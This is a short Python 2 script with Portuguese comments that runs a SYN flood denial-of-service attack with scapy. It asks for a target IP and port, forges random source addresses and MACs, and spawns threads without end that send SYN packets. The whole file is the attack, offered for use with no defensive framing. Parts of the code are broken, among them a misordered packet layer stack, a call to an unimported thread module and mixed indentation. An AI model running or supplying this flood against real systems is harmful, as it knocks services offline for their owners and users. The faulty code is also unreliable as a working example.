#!/usr/bin/python
#coding=utf-8

from os import system
from random import randint	
import socket
from time import sleep
from thread import start_new_thread
from sys import exit
from scapy.all import *
from scapy.error import Scapy_Exception
number = 0
red = '33[31m'

def synTCP(ip_alvo,porta_alvo):
	ip = IP()
	# spoof IP com randint 
	ip.src = "%i.%i.%i.%i" % (randint(1,254),randint(1,254),randint(1,254),randint(1,254))
	# IP alvo
	ip.dst = ip_alvo
	tcp = TCP()
	# porta de origem
	tcp.sport = randint(1,65535)
	#porta flood
	tcp.dport = porta_alvo
	# SYN flood ataque
	tcp.flags = "S"
	# Criando pacote
	send(ip/tcp/Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff"), loop= 1, verbose=1)
	sleep(10)
    	thread.exit()

ip_alvo = raw_input ("Digite o IP: ")
porta_alvo = input ("Digite a porta :")

while(1):
	try:
		number = number + 1
		#system("ip route")
		#system(" ifconfig %s hw ether %s"%(interface,MAC))
		# Criando a thread
		start_new_thread(synTCP,(ip_alvo,porta_alvo ))
	 	print "Pacote(s) enviado(s) ---> %s" %str(number)
	except socket.error:
		print ("Ataque encerrou!")
		exit(1)


